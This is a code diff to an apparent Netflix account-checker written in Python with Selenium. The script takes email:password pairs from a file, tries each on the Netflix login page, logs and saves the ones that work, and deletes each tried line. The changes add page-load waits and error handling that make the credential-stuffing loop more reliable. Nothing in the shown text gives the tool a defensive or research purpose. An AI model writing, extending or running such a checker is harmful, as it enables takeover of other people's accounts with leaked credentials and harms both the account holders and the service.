@@ -35,6 +35,13 @@ def accLog(text, filename):
         accs.write(text + "\n")
 
 
+def removeLine(file):
+    with open(file, 'r') as fIn:
+        data = fIn.read().splitlines(True)
+    with open(file, 'w') as fOut:
+        fOut.writelines(data[1:])
+
+
 def netflix():
     log("launching webdriver for netflix")
     driver = webdriver.Chrome()
@@ -52,7 +59,14 @@ def netflix():
                 fileTime.strftime("%Y-%m-%d_%H-%M-%S") + ".txt")
     credentials = read()
     for acc in credentials:
-        time.sleep(1)
+        try:
+            WebDriverWait(driver, 5).until(
+                EC.presence_of_element_located((
+                    By.ID, "id_userLoginId"))
+            )
+        except:
+            log("Could not load")
+            break
         emailInput = driver.find_element_by_id("id_userLoginId")
         passInput = driver.find_element_by_id("id_password")
         logIn = driver.find_element_by_xpath(
@@ -60,6 +74,8 @@ def netflix():
         email = re.split("\s|:", acc)[0]
         password = re.split("\s|:", acc)[1]
         if len(password) < 4:
+            log("short password for " + acc)
+            removeLine('accounts.txt')
             continue
         emailInput.clear()
         emailInput.send_keys(email)
@@ -73,18 +89,33 @@ def netflix():
             )
             error = driver.find_element_by_xpath(
                 '//*[@id="appMountPoint"]/div/div[3]/div/div/div[1]/div/div[2]')
-            dn = error.get_attribute("innerHTML").split('"')[1]
+            try:
+                dn = error.get_attribute("innerHTML").split('"')[1]
+            except:
+                log(error)
             if dn == "/loginHelp":
                 log("Wrong password for " + acc)
             elif dn == "/":
                 log("Account " + acc + " doesn't exist")
             else:
                 log("Couldn't sign in for unknown reasons with " + acc)
+                log(error)
+                log(dn)
+            removeLine('accounts.txt')
             continue
         except:
+            try:
+                WebDriverWait(driver, 5).until(
+                    EC.presence_of_element_located((
+                        By.LINK_TEXT, "Sign Out"))
+                )
+            except:
+                log("Could not load")
+                break
             logout = driver.find_element_by_link_text("Sign Out")
             log("Password working for " + acc)
             accLog(acc, fileName)
+            removeLine('accounts.txt')
             logout.click()
             #goNow = driver.find_element_by_link_text("Go now")
             # goNow.click()
